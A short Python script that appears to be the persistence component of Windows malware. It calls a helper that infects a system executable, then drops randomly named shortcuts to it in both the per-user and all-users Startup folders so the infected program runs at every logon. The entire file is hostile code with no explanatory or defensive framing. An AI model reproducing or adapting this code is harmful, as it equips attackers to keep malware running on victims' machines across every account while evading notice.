import os
import winutils

lnk_path = 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{0}.lnk'.format(winutils.random_name())
target = winutils.infect_system_exe()
working_dir = os.getenv('userprofile')

# User
shortcut_path = os.path.join(os.getenv('appdata'), lnk_path)
winutils.create_shortcut(shortcut_path, target, working_dir=working_dir)

# All Users
shortcut_path = os.path.join(os.getenv('allusersprofile'), lnk_path)
winutils.create_shortcut(shortcut_path, target, working_dir=working_dir)
